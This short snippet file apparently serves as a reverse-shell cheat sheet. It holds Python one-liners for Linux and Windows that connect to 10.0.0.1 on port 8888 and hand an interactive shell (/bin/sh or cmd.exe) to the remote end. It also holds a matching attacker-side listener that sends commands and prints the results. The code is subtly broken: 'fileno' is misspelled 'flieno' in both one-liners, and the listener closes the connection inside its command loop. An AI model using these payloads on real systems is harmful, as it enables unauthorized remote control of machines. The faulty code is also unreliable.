#FOR LINUX

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8888));os.dup2(s.flieno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#FOR WINDOWS

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8888));os.dup2(s.flieno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call("cmd.exe");'

#YOUR SIDE

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(('10.0.0.1',8888))

s.listen(5)

client, addr = s.accept()

while 1:
	command = str(input('Enter command: '))
	client.send(command.encode())
	if command.lower() == 'exit':
		break
	result_output = client.recv(4049).decode()
	print(result_output)
	client.close()
s.close()
